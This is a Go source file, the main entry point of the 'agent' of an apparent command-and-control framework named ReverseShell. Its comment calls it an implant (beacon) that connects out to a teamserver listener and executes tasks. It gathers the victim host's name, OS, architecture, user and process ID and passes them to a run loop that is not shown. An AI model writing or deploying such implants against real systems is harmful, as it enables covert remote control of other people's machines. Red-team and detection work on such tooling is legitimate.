// Command agent runs the ReverseShell implant (beacon): it connects out to
// the teamserver's listener, registers, and executes tasks (README §2).
package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"os/user"
	"runtime"
	"strconv"
	"syscall"

	"reverseshell/internal/agent"
	"reverseshell/internal/config"
	"reverseshell/internal/protocol"
	"reverseshell/internal/session"
)

func main() {
	var (
		cfgPath   = flag.String("config", "config.toml", "path to TOML config (optional)")
		host      = flag.String("host", "", "listener host (overrides config)")
		port      = flag.Int("port", 0, "listener port (overrides config)")
		transport = flag.String("transport", "", "session transport (overrides config)")
	)
	flag.Parse()

	cfg, err := config.Load(*cfgPath)
	if err != nil {
		fail(err)
	}
	if *host != "" {
		cfg.Agent.ConnectHost = *host
	}
	if *port != 0 {
		cfg.Agent.ConnectPort = *port
	}
	if *transport != "" {
		cfg.Agent.Transport = *transport
	}

	hostname, _ := os.Hostname()
	u, err := user.Current()
	if err != nil {
		u = &user.User{}
	}
	nonce, err := session.NewNonce()
	if err != nil {
		fail(err)
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	err = agent.Run(ctx, agent.Config{
		Addr:          net.JoinHostPort(cfg.Agent.ConnectHost, strconv.Itoa(cfg.Agent.ConnectPort)),
		TransportName: cfg.Agent.Transport,
		MaxFrameBytes: protocol.DefaultMaxFrameBytes,
		Info: protocol.AgentInfo{
			Hostname:      hostname,
			OS:            runtime.GOOS,
			Arch:          runtime.GOARCH,
			User:          u.Username,
			PID:           os.Getpid(),
			ClientVersion: agent.Version,
			Nonce:         nonce,
		},
	})
	if err != nil {
		fail(err)
	}
}

func fail(err error) {
	fmt.Fprintln(os.Stderr, "agent:", err)
	os.Exit(1)
}
